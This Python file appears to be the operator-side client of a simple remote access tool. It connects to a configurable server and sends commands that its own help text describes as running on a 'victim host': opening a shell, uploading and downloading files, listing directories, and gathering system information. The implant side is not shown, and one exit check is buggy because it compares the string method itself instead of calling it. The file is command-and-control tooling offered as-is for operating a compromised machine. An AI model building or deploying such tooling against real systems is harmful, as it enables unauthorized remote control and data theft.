from socket import socket, AF_INET, SOCK_STREAM
from os import system, name

# IP & port of the server

def_commands = """
    pwd         show current working directory
    user        show the user of victim host
    listdir     list every item in the current directory
    sysinfo     show information about the victim system
    kill        kill the client and server
    shell       open a shell interface on victim
    upload      upload a file
    download    download a file
    """

def run_connection():

    simple_cmd = ["listdir", "user", "sysinfo", "pwd", "upload", "download", "shell", "clear"]

    server_ip = "127.0.0.1" # replace with server IP
    port = 64780 # replace with server port

    # establish connection
    client_connection = socket(AF_INET, SOCK_STREAM)
    client_connection.connect((server_ip, port))
    response = client_connection.recv(2048).decode("utf-8")
    #response = response.decode("utf-8")
    print("connection established with", response)

    while True:

       # input message
        user_input = str(input("Enter commands: "))

        # check if there is any input, if not break
        if user_input == "help":
            print (def_commands)
            continue
        elif user_input == "kill": # kills server and client
            client_connection.send(user_input.encode()[:2048])
            break
        elif user_input in simple_cmd:
            print("sending...")
        else:
            print ("No input was entered")
            system('cls' if name == 'nt' else 'clear')
            print("please enter a command")
            continue

        client_connection.send(user_input.encode()[:2048])
        print("command send")

        response = client_connection.recv(2048)
        response = response.decode("utf-8")

        # break out of loop when server sends closed in response
        if response.lower == "exit":
            break

        print(f"{response}")

if __name__ == "__main__":
    run_connection()